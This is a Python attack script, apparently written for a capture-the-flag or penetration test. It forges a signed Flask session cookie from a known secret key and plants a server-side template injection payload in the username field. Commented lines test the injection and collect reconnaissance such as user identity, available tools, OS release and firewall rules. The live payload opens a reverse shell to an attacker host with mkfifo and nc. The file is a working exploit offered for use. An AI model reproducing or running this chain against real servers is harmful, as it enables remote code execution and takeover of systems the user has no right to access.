#!/usr/bin/python3

from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "PUT THE KEY HERE"

@app.route("/")
def main():
    session["auth"] = "True"
    # session["username"] = "{{7*6}}"
    # session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"""
    # session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('echo ""; id; whoami; echo ""; which nc bash curl wget; echo ""; sestatus 2>&1; aa-status 2>&1; echo ""; cat /etc/*-release; echo""; cat /etc/iptables/*').read()}}"""
    session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc CONNECTION_IP 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}"""
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))

        